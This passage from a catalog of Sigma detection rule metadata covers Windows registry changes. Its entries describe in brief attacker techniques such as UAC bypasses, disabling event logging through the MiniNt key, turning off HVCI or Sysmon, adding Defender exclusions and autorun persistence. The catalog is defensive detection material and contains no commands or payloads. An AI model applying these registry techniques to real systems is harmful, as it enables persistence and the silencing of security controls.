  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: d6c2ce7e-afb5-4337-9ca4-4b5254ed0565
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_winsock2.yml
  name: WinSock2 Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: b29aed60-ebd1-442b-9cb5-16a1d0324adb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node.yml
  name: Wow6432Node CurrentVersion Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  - https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: 18f2065c-d36c-464a-a748-bcf909acb2e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node_classes.yml
  name: Wow6432Node Classes Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: 480421f9-417f-4d3b-9552-fd2728443ec8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node_currentversion.yml
  name: Wow6432Node Windows NT CurrentVersion Autorun Keys Modification
  description: Detects modification of autostart extensibility point (ASEP) in registry.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.001
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1547.001/T1547.001.md
  - https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
  - https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d
  false_positives:
  - Legitimate software automatically (mostly, during installation) sets up autorun
    keys for legitimate reason
  - Legitimate administrator sets up autorun keys for legitimate reason
  notes: ''
- detection_id: 53330955-dc52-487f-a3a2-da24dcff99b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bginfo_custom_db.yml
  name: New BgInfo.EXE Custom DB Path Registry Configuration
  description: Detects setting of a new registry database value related to BgInfo
    configuration. Attackers can for example set this value to save the results of
    the commands executed by BgInfo in order to exfiltrate information.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate use of external DB to save the results
  notes: ''
- detection_id: 992dd79f-dde8-4bb0-9085-6350ba97cfb3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bginfo_custom_vbscript.yml
  name: New BgInfo.EXE Custom VBScript Registry Configuration
  description: Detects setting of a new registry value related to BgInfo configuration,
    which can be abused to execute custom VBScript via "BgInfo.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate VBScript
  notes: ''
- detection_id: cd277474-5c52-4423-a52b-ac2d7969902f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bginfo_custom_wmi_query.yml
  name: New BgInfo.EXE Custom WMI Query Registry Configuration
  description: Detects setting of a new registry value related to BgInfo configuration,
    which can be abused to execute custom WMI query via "BgInfo.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Legitimate WMI query
  notes: ''
- detection_id: 46dd5308-4572-4d12-aa43-8938f0184d4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bypass_uac_using_delegateexecute.yml
  name: Bypass UAC Using DelegateExecute
  description: Bypasses User Account Control using a fileless method
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand
  - https://devblogs.microsoft.com/oldnewthing/20100312-01/?p=14623
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-7---bypass-uac-using-sdclt-delegateexecute
  false_positives:
  - Unknown
  notes: ''
- detection_id: 674202d0-b22a-4af4-ae5f-2eda1f3da1af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bypass_uac_using_eventviewer.yml
  name: Bypass UAC Using Event Viewer
  description: Bypasses User Account Control using Event Viewer and a relevant Windows
    Registry modification
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.010
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.010
  time_window: ''
  references:
  - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-1---bypass-uac-using-event-viewer-cmd
  false_positives:
  - Unknown
  notes: ''
- detection_id: 724ea201-6514-4f38-9739-e5973c34f49a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task.yml
  name: Bypass UAC Using SilentCleanup Task
  description: 'Detects the setting of the environement variable "windir" to a non
    default value.

    Attackers often abuse this variable in order to trigger a UAC bypass via the "SilentCleanup"
    task.

    The SilentCleanup task located in %windir%\system32\cleanmgr.exe is an auto-elevated
    task that can be abused to elevate any file with administrator privileges without
    prompting UAC.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1548.002
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1548.002
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1548.002/T1548.002.md#atomic-test-9---bypass-uac-using-silentcleanup-task
  - https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
  - https://www.fortinet.com/blog/threat-research/enter-the-darkgate-new-cryptocurrency-mining-and-ransomware-campaign
  false_positives:
  - Unknown
  notes: ''
- detection_id: 509e84b9-a71a-40e0-834f-05470369bd1e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_change_rdp_port.yml
  name: Default RDP Port Changed to Non Standard Port
  description: 'Detects changes to the default RDP port.

    Remote desktop is a common feature in operating systems. It allows a user to log
    into a remote system using an interactive session with a graphical user interface.

    Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as
    Remote Desktop Services (RDS).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1547.010
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1547.010
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 45e112d0-7759-4c2a-aa36-9f8fb79d3393
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_change_security_zones.yml
  name: IE Change Domain Zone
  description: Hides the file extension through modification of the registry
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1137
  tags:
  - attack.persistence
  - attack.t1137
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1112/T1112.md#atomic-test-4---add-domain-to-trusted-sites-zone
  - https://learn.microsoft.com/en-us/troubleshoot/developer/browsers/security-privacy/ie-security-zones-registry-entries
  false_positives:
  - Administrative scripts
  notes: ''
- detection_id: 4916a35e-bfc4-47d0-8e25-a003d7067061
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_change_sysmon_driver_altitude.yml
  name: Sysmon Driver Altitude Change
  description: 'Detects changes in Sysmon driver altitude value.

    If the Sysmon driver is configured to load at an altitude of another registered
    service, it will fail to load at boot.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://posts.specterops.io/shhmon-silencing-sysmon-via-driver-unload-682b5be57650
  - https://youtu.be/zSihR3lTf7g
  false_positives:
  - Legitimate driver altitude change to hide sysmon
  notes: ''
- detection_id: 7d9263bd-dc47-4a58-bc92-5474abab390c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_change_winevt_channelaccess.yml
  name: Change Winevt Channel Access Permission Via Registry
  description: Detects tampering with the "ChannelAccess" registry key in order to
    change access to Windows event channel.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.002
  tags:
  - attack.defense-evasion
  - attack.t1562.002
  time_window: ''
  references:
  - https://app.any.run/tasks/77b2e328-8f36-46b2-b2e2-8a80398217ab/
  - https://learn.microsoft.com/en-us/windows/win32/api/winevt/
  - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/
  false_positives:
  - Unknown
  notes: ''
- detection_id: b64a026b-8deb-4c1d-92fd-98893209dff1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_chrome_extension.yml
  name: Running Chrome VPN Extensions via the Registry 2 VPN Extension
  description: Running Chrome VPN Extensions via the Registry install 2 vpn extension
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1133
  tags:
  - attack.initial-access
  - attack.persistence
  - attack.t1133
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1133/T1133.md#atomic-test-1---running-chrome-vpn-extensions-via-the-registry-2-vpn-extension
  false_positives:
  - Unknown
  notes: ''
- detection_id: ac9159cc-c364-4304-8f0a-d63fc1a0aabb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_clickonce_trust_prompt.yml
  name: ClickOnce Trust Prompt Tampering
  description: Detects changes to the ClickOnce trust prompt registry key in order
    to enable an installation from different locations such as the Internet.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  - https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior
  false_positives:
  - Legitimate internal requirements.
  notes: ''
- detection_id: 61a7697c-cb79-42a8-a2ff-5f0cdfae0130
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml
  name: Potential CobaltStrike Service Installations - Registry
  description: 'Detects known malicious service installs that appear in cases in which
    a Cobalt Strike beacon elevates privileges or lateral movement.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1021.002
  - T1543.003
  - T1569.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.lateral-movement
  - attack.t1021.002
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 07743f65-7ec9-404a-a519-913db7118a8d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_comhijack_sdclt.yml
  name: COM Hijack via Sdclt
  description: Detects changes to 'HKCU\Software\Classes\Folder\shell\open\command\DelegateExecute'
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546
  - T1548
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1546
  - attack.t1548
  time_window: ''
  references:
  - http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
  - https://www.exploit-db.com/exploits/47696
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2ff692c2-4594-41ec-8fcb-46587de769e0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_crashdump_disabled.yml
  name: CrashControl CrashDump Disabled
  description: Detects disabling the CrashDump per registry (as used by HermeticWiper)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1564
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1564
  - attack.t1112
  time_window: ''
  references:
  - https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/
  false_positives:
  - Legitimate disabling of crashdumps
  notes: ''
- detection_id: 8839e550-52d7-4958-9f2f-e13c1e736838
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_create_minint_key.yml
  name: Security Event Logging Disabled via MiniNt Registry Key - Registry Set
  description: 'Detects the addition of the ''MiniNt'' key to the registry. Upon a
    reboot, Windows Event Log service will stop writing events.

    Windows Event Log is a service that collects and stores event logs from the operating
    system and applications. It is an important component of Windows security and
    auditing.

    Adversary may want to disable this service to disable logging of security events
    which could be used to detect their activities.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1562.002
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1562.002
  - attack.t1112
  - car.2022-03-001
  time_window: ''
  references:
  - https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/
  false_positives:
  - Highly Unlikely
  notes: ''
- detection_id: a07f0359-4c90-4dc4-a681-8ffea40b4f47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_creation_service_susp_folder.yml
  name: Service Binary in Suspicious Folder
  description: Detect the creation of a service with a service binary located in a
    suspicious directory
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7530b96f-ad8e-431d-a04d-ac85cc461fdc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_custom_file_open_handler_powershell_execution.yml
  name: Custom File Open Handler Executes PowerShell
  description: Detects the abuse of custom file open handler, executing powershell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://news.sophos.com/en-us/2022/02/01/solarmarker-campaign-used-novel-registry-changes-to-establish-persistence/?cmp=30728
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9827ae57-3802-418f-994b-d5ecf5cd974b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dbgmanageddebugger_persistence.yml
  name: Potential Registry Persistence Attempt Via DbgManagedDebugger
  description: Detects the addition of the "Debugger" value to the "DbgManagedDebugger"
    key in order to achieve persistence. Which will get invoked when an application
    crashes
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.persistence
  - attack.t1574
  time_window: ''
  references:
  - https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/
  - https://github.com/last-byte/PersistenceSniper
  false_positives:
  - Legitimate use of the key to setup a debugger. Which is often the case on developers
    machines
  notes: ''
- detection_id: a982fc9c-6333-4ffb-a51d-addb04e8b529
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_defender_exclusions.yml
  name: Windows Defender Exclusions Added - Registry
  description: Detects the Setting of Windows Defender Exclusions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/_nullbind/status/1204923340810543109
  false_positives:
  - Administrator actions
  notes: ''
- detection_id: 85b88e05-dadc-430b-8a9e-53ff1cd30aae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_desktop_background_change.yml
  name: Potentially Suspicious Desktop Background Change Via Registry
  description: 'Detects registry value settings that would replace the user''s desktop
    background.

    This is a common technique used by malware to change the desktop background to
    a ransom note or other image.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Impact
  - Persistence
  techniques:
  - T1112
  - T1491.001
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.impact
  - attack.t1112
  - attack.t1491.001
  time_window: ''
  references:
  - https://www.attackiq.com/2023/09/20/emulating-rhysida/
  - https://research.checkpoint.com/2023/the-rhysida-ransomware-activity-analysis-and-ties-to-vice-society/
  - https://www.trendmicro.com/en_us/research/23/h/an-overview-of-the-new-rhysida-ransomware.html
  - https://www.virustotal.com/gui/file/a864282fea5a536510ae86c77ce46f7827687783628e4f2ceb5bf2c41b8cd3c6/behavior
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.WindowsDesktop::Wallpaper
  - https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.ControlPanelDisplay::CPL_Personalization_NoDesktopBackgroundUI
  false_positives:
  - Administrative scripts that change the desktop background to a company logo or
    other image.
  notes: ''
- detection_id: 31e124fb-5dc4-42a0-83b3-44a69c77b271
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_devdrv_disallow_antivirus_filter.yml
  name: Antivirus Filter Driver Disallowed On Dev Drive - Registry
  description: 'Detects activity that indicates a user disabling the ability for Antivirus
    mini filter to inspect a "Dev Drive".

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/0gtweet/status/1720419490519752955
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 8b7273a4-ba5d-4d8a-b04f-11f2900d043a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_deviceguard_hypervisorenforcedcodeintegrity_disabled.yml
  name: Hypervisor Enforced Code Integrity Disabled
  description: 'Detects changes to the HypervisorEnforcedCodeIntegrity registry key
    and the "Enabled" value being set to 0 in order to disable the Hypervisor Enforced
    Code Integrity feature. This allows an attacker to load unsigned and untrusted
    code to be run in the kernel

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/
  - https://github.com/redcanaryco/atomic-red-team/blob/04e487c1828d76df3e834621f4f893ea756d5232/atomics/T1562.001/T1562.001.md#atomic-test-43---disable-hypervisor-enforced-code-integrity-hvci
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7f2954d2-99c2-4d42-a065-ca36740f187b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_deviceguard_hypervisorenforcedpagingtranslation_disabled.yml
  name: Hypervisor Enforced Paging Translation Disabled
  description: 'Detects changes to the "DisableHypervisorEnforcedPagingTranslation"
    registry value. Where the it is set to "1" in order to disable the Hypervisor
    Enforced Paging Translation feature.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/standa_t/status/1808868985678803222
  - https://github.com/AaLl86/WindowsInternals/blob/070dc4f317726dfb6ffd2b7a7c121a33a8659b5e/Slides/Hypervisor-enforced%20Paging%20Translation%20-%20The%20end%20of%20non%20data-driven%20Kernel%20Exploits%20(Recon2024).pdf
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9d3436ef-9476-4c43-acca-90ce06bdf33a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/registry/registry_set/registry_set_dhcp_calloutdll.yml
  name: DHCP Callout DLL Installation
  description: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled
    parameter in Registry, which can be used to execute code in context of the DHCP
    server (restart required)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.t1112
  time_window: ''
  references:
  - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html
  - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx
  - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx
  false_positives:
